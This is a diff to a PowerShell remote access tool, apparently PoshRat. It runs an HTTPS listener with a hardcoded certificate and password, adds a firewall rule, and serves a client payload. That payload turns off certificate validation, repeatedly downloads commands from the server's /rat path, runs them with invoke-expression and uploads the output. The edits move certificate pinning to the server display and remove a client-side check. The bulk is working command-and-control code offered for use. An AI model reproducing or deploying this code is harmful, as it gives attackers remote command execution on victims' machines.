@@ -19,6 +19,9 @@ $Base64Cert = 'MIII4wIBAzCCCJ8GCSqGSIb3DQEHAaCCCJAEggiMMIIIiDCCA8EGCSqGSIb3DQEHA
 
 $CertPassword = 'password' #yeah, really.
 
+$CertPinThumb = (New-Object System.Security.Cryptography.X509Certificates.X509Certificate2([System.Convert]::FromBase64String($Base64Cert), $CertPassword)).Thumbprint
+
+
 function Receive-ClientHttpsRequest([System.Net.Sockets.TcpClient] $client)
 {
 	
@@ -27,7 +30,7 @@ $SSLStream = New-Object System.Net.Security.SslStream($clientStream , $false)
 
 $SSLcertfake = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2([System.Convert]::FromBase64String($Base64Cert), $CertPassword)
 $SSLThumbprint = $SSLcertfake.Thumbprint
-Write-Host $SSLThumprint -fore yellow
+
 $SSLStream.AuthenticateAsServer($SSLcertfake, $false, [System.Security.Authentication.SslProtocols]::Tls, $false)
 
 $SSLbyteArray = new-object System.Byte[] 32768
@@ -57,7 +60,7 @@ Write-Host "Connect Request Received" -Fore White
 $SSLResponse += '
 $SSLThumbprint = "'+$SSLThumbprint+'"
 
-function Invoke-CertCheck ()
+function Invoke-CertCheck()
 {	
 	$Uri = "https://'+$Server+'/rat"
 	[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
@@ -68,18 +71,6 @@ function Invoke-CertCheck ()
 	return $cert.Thumbprint
 }
 
-$crt = Invoke-CertCheck
-if($crt -eq $SSLThumbprint)
-{
-	Write-Host "SSLThumbprint Checks"
-}
-else
-{
-	Write-Host "Someone Is Fn With The Pipe"
-	#Add Something Nasty Here...
-}
-
-
 $p = [System.Net.WebRequest]::GetSystemWebProxy()
 $s = "https://' + $Server + '/rat"
 $w = New-Object Net.WebClient 
@@ -88,7 +79,6 @@ while($true)
 {
 	$r = $w.DownloadString($s) 
 	while($r) {
-	
 		[string]$o = invoke-expression $r | out-string 
 		$w.UploadString($s, $o)	| out-null
 		break
@@ -140,7 +130,8 @@ netsh advfirewall firewall delete rule name="PoshRat Server $Port" | Out-Null #F
 netsh advfirewall firewall add rule name="PoshRat Server $Port" dir=in action=allow protocol=TCP localport=$Port | Out-Null
 
 $listener.Start()
-[Console]::WriteLine("Listening on $Port")
+Write-Host "Listening on $Port" -fore Yellow
+Write-Host $CertPinThumb -fore Yellow 
 $Client = New-Object System.Net.Sockets.TcpClient
 $Client.NoDelay = $true
 
